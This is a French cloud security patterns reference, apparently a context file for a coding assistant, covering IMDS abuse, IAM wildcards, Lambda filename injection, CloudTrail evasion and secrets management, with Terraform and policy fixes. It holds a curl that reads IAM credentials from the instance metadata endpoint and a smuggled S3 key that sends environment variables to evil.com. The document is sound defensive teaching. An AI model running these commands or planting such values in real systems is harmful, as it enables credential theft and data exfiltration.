# Infra Cloud — Security Patterns
> Tags: aws, gcp, azure, cloud, serverless, iam
> Load when: project deploys to AWS, GCP, Azure, or uses serverless functions

## CVEs Critiques

| CVE | CVSS | Service | Impact | Fix |
|-----|------|---------|--------|-----|
| CVE-2025-51591 | — | Pandoc (SSRF) | SSRF → IMDS AWS → credentials IAM exfiltrés, exploité août-sept 2025 | IMDSv2 enforced |
| CVE-2025-55241 | 10.0 | Azure AD Graph API | "Actor tokens" cross-tenant sans vérif tenant → usurpation Global Admin, bypass MFA + Conditional Access, sans log | API retirée 31 août 2025 |

## Failles Spécifiques

### SSRF → IMDS → Credentials AWS (pattern #1)

```bash
# IMDSv1 — aucune auth, accessible depuis tout code exécuté sur l'instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
# → AccessKeyId + SecretAccessKey + SessionToken (credentials temporaires mais valides)
```

~50% des instances EC2 n'enforçent pas encore IMDSv2.

```hcl
# FIX Terraform — IMDSv2 obligatoire
resource "aws_instance" "secure" {
  metadata_options {
    http_tokens                 = "required"   # IMDSv2
    http_put_response_hop_limit = 1            # bloque les containers imbriqués
  }
}
```

SCP org-wide pour bloquer toute instance sans IMDSv2 :
```json
{
  "Effect": "Deny",
  "Action": "ec2:RunInstances",
  "Resource": "arn:aws:ec2:*:*:instance/*",
  "Condition": {
    "StringNotEquals": {
      "ec2:MetadataHttpTokens": "required"
    }
  }
}
```

### IAM God-mode + STS Chaining

```json
// VULN — wildcard = accès total au compte
{ "Effect": "Allow", "Action": "*", "Resource": "*" }

// FIX — least privilege, ressource précise
{
  "Effect": "Allow",
  "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::my-bucket/path/*"
}
```

STS chaining : `aws sts assume-role` progressif → escalade cross-account vers admin.

```json
// Mitigation : condition sur l'organisation et MFA
{
  "Condition": {
    "StringEquals": {"aws:PrincipalOrgID": "o-xxxxxxxxxx"},
    "Bool": {"aws:MultiFactorAuthPresent": "true"}
  }
}
```

Outils : `IAM Access Analyzer` (AWS natif), `Prowler`, `CloudSploit`.

### Lambda — Injection via nom de fichier S3

```python
# VULN — commande shell avec clé S3 non validée
import subprocess
def handler(event, context):
    key = event["Records"][0]["s3"]["object"]["key"]
    subprocess.run(f"file /tmp/{key}", shell=True)
# Attaque : key = "file;curl evil.com?t=$(env|base64);.txt"

# FIX — validation stricte + args séparés
import re, boto3
SAFE_PATTERN = re.compile(r'^[a-zA-Z0-9._\-/]+$')
def handler(event, context):
    key = event["Records"][0]["s3"]["object"]["key"]
    if not SAFE_PATTERN.match(key):
        raise ValueError("Invalid key")
    boto3.client("s3").head_object(Bucket="my-bucket", Key=key)
    subprocess.run(["file", f"/tmp/{key}"])  # args séparés, pas shell=True
```

### Stockage public + CloudTrail Evasion

```hcl
# S3 public access block (compte entier)
resource "aws_s3_account_public_access_block" "default" {
  block_public_acls = true; block_public_policy = true
  ignore_public_acls = true; restrict_public_buckets = true
}
```

```json
// CloudTrail : policy > 102 401 chars → omission silencieuse (Permiso jan 2025)
// SCP anti-evasion
{ "Effect": "Deny",
  "Action": ["cloudtrail:DeleteTrail","cloudtrail:StopLogging","cloudtrail:PutEventSelectors"],
  "Resource": "*" }
```

## Secrets Management

**Stats 2025** : 88% des breaches impliquent des credentials compromis. 59% des IAM AWS / 55% des SA GCP / 40% des Entra ID ont des clés de plus d'un an.

### 5 anti-patterns critiques

```
1. .env commité → git history permanente. FIX : .gitignore + truffleHog pre-commit.
2. docker run -e SECRET=... → /proc/<pid>/environ. FIX : Docker secrets/file mounts.
3. logger.debug(api_key) → ELK/CloudWatch. FIX : redaction filters.
4. COPY .env / ARG PASSWORD → layer immuable. FIX : BuildKit --mount=type=secret.
5. Credentials hardcodés → SDK credential chain (boto3/IAM role/OIDC auto).
```

### HashiCorp Vault + SOPS

```hcl
# Vault — unseal via KMS, policy least privilege
seal "awskms" { kms_key_id = "alias/vault-unseal-key" }
path "secret/data/myapp/*" { capabilities = ["read"] }
# Anti-pattern : path "*" { capabilities = ["create","read","update","delete","list","sudo"] }
```

```bash
# SOPS (CNCF) — chiffre les valeurs, clés lisibles → git-friendly
sops -e -i secrets.yaml && sops -d secrets.yaml | kubectl apply -f -
# Backends : AWS KMS, GCP KMS, Azure Key Vault, age
```

## Hardening Checklist

- [ ] IMDSv2 enforced sur toutes les instances EC2 (SCP org-wide)
- [ ] Aucune policy IAM avec `Action: *` ou `Resource: *`
- [ ] IAM Access Analyzer activé sur chaque compte et organisation
- [ ] Tous les buckets S3/GCS/Blob : public access block activé
- [ ] CloudTrail : SCP interdisant `DeleteTrail`/`StopLogging`/`PutEventSelectors`
- [ ] Lambda/Cloud Functions : validation regex stricte des inputs event
- [ ] Cognito : email verified + MFA ON + refresh token ≤ 8h
- [ ] Vault : unseal via KMS, policies least privilege (pas de wildcard)
- [ ] SOPS ou External Secrets Operator pour tous les secrets en repo/K8s
- [ ] Rotation automatique des credentials IAM (< 90 jours), alertes sur clés > 1 an
- [ ] Azure AD : migré hors de l'API Graph retirée (CVE-2025-55241)
- [ ] STS : conditions `PrincipalOrgID` + MFA sur tous les assume-role cross-account
